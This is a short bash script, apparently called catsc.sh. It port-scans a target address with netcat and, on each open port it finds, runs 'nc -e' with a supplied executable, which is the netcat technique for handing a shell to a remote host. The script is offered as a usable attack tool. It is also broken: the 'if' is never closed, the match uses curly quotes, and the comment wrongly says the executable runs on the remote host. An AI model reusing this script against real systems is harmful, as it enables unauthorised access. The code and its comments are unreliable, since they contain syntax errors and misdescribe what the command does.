#!/bin/bash
# @author: noah michaels
# usage: ./catsc.sh [address] [lower port] [higher port] [executable]
for i in `seq $2 $3`; do
	scan=`nc -nvz $1 $i -w 3`				# scan range [low port]-[high port]
	if [[ $scan == *”open” ]]; then # if port is open,
    nc -v $1 $i -e $4 -w 3				# try to execute on remote host
done
